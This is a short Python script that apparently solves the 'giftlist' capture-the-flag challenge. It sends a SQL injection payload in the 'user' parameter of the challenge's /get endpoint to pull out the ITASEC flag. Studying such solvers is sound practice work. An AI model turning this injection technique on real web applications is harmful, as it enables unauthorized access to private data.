#!/usr/bin/python3

import logging
import os

import requests

logging.disable()

URL = os.environ.get("URL", "http://giftlist.challs.olicyber.it")
if URL.endswith("/"):
    URL = URL[:-1]

# cheat a little bit to avoid too many results
r = requests.get(f'{URL}/get', params={'user': "' OR info LIKE 'ITASEC{sql%"})
r.raise_for_status()

print(r.text)
